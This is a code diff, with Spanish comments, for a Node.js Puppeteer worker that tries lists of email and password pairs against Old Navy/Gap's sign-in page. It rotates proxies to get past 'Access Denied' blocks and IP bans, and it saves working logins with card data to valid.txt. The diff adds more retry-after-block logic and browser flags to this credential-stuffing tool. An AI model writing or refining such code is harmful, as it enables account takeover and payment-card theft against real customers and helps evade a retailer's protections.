@@ -29,7 +29,7 @@ parentPort.on('message', async (message) => {
         isPaused = false;
         parentPort.postMessage('Worker reanudado');
     } else if (message === 'stop') {
-        console.log('Intentando detener el worker...');
+        console.log('worker detenido');
         if (browser) {
             try {
                 await browser.close(); // Cierra el navegador
@@ -44,10 +44,10 @@ parentPort.on('message', async (message) => {
 
 
 
-async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNewProxy, humanizedMode) {
+async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNewProxy ,retrySameEmailNoProxy , humanizedMode) {
     let proxyIndex = 0;
     const results = [];
-
+    
     for (let i = 0; i < credentials.length; i++) {
         await checkPaused();
         const { email, password } = credentials[i];
@@ -60,7 +60,7 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
             await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', { waitUntil: 'domcontentloaded' });
             
             await checkPaused();
-            // Modo Humanizado
+
             const accessDenied = await page.evaluate(() => {
                 const h1Element = document.querySelector('h1');
                 return h1Element && h1Element.textContent.includes('Access Denied');
@@ -234,35 +234,53 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
                 parentPort.postMessage('No se pudo determinar el estado del correo.');
             }
         } catch (error) {
+            if (error.message.includes('IP bloqueada')) {
+                // Aquí maneja el caso de IP bloqueada
+                parentPort.postMessage('Manejando IP bloqueada...');
+                 if (!useProxies && retrySameEmailNoProxy) {
+                    parentPort.postMessage('Reintentando con el mismo correo sin proxy...');
+                    i--;
+                }else if(retrySameEmailWithNewProxy ) {
+                    parentPort.postMessage('Reintentando con el mismo correo con un nuevo proxy...');
+                    i--;
+                }
+            } 
             if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
                 parentPort.postMessage(`Proxy ${proxy} no soportado. Cambiando a otro proxy...`);
                 await browser.close();
                 proxyIndex = (proxyIndex + 1) % proxies.length;
                 if (retrySameEmailWithNewProxy) {
+                    parentPort.postMessage('Reintentando con el mismo correo con un nuevo proxy...');
                     i--; // Reintentar con el mismo correo pero con un proxy diferente
                 }
             } else if (error.name === 'TimeoutError') {
                 parentPort.postMessage('TimeoutError detectado. Asumiendo IP bloqueada.');
+                await browser.close();
+        
                 if (useProxies && proxies.length > 0) {
                     parentPort.postMessage('Cambiando al siguiente proxy...');
                     proxyIndex = (proxyIndex + 1) % proxies.length;
                     if (retrySameEmailWithNewProxy) {
+                        parentPort.postMessage('Reintentando con el mismo correo...');
                         i--; // Reintentar con el mismo correo pero con un proxy diferente
                     }
+                } else if (!useProxies && retrySameEmailNoProxy) {
+                    parentPort.postMessage('Reintentando con el mismo correo sin proxy...');
+                    i--; // Reintentar con el mismo correo pero sin proxy
                 }
-                await browser.close();
             } else {
                 parentPort.postMessage(`Error inesperado: ${error.message}`);
                 await browser.close();
             }
             continue;
         }
-
+        
         await browser.close();
     }
     
     fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
     await checkPaused();
+    parentPort.postMessage('Worker ha finalizado todas las tareas.');
 }
 
 
@@ -275,7 +293,10 @@ async function createBrowserInstance(proxy) {
         '--disable-extensions',
         '--disable-dev-shm-usage',
         '--disable-infobars',
-        '--window-size=1280,800'
+        '--window-size=1280,800',
+        '--disable-accelerated-2d-canvas', 
+        '--disable-gpu', 
+        '--incognito', 
     ];
 
     let proxyAuth;
@@ -307,12 +328,13 @@ async function createBrowserInstance(proxy) {
             await page.authenticate(proxyAuth);
         }
 
+
+
         return { browser, page };
 
     } catch (error) {
         console.error("Error al crear la instancia del navegador:", error.message);
-        // Aquí podrías lanzar el error o manejarlo según lo que necesites hacer.
-        throw error; // Lanza el error para que pueda ser manejado en otro lugar, si es necesario.
+        throw error; 
     }
 }
 
@@ -330,4 +352,4 @@ function saveValidData(email, password, cardData) {
     fs.appendFileSync('valid.txt', data);
 }
 
-runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retrySameEmailWithNewProxy ,workerData.humanizedMode).catch(console.error);
+runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retrySameEmailWithNewProxy,workerData.retrySameEmailNoProxy ,workerData.humanizedMode).catch(console.error);
